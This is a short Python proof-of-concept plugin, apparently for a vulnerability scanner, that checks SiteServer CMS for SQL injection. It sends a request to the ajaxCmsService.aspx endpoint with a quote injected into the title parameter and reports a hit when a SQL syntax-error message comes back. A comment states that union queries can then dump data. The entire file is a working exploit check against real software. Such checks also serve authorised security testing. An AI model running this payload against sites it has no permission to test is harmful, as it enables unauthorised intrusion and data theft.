# Author:w8ay
# Name:siteserver前台注入
# Referer:https://forum.90sec.com/t/topic/573
import HackRequests

def poc(arg, **kwargs):
    payload= arg + "ajax/ajaxCmsService.aspx?type=GetTitles&channelID=2&nodeID=153&title=2'&publishmentSystemID=1"
    hh = HackRequests.http(payload)
    if hh.status_code == 200 and "附近有语法错误" in hh.text():
        result = {
            "name": "siteserver前台注入",  # 插件名称
            "content": "title参数未过滤，可使用union查询爆出数据信息",  # 插件返回内容详情，会造成什么后果。
            "url": payload,  # 漏洞存在url
            "log": hh.log,
            "tag": "sqli"  # 漏洞标签
        }
        return result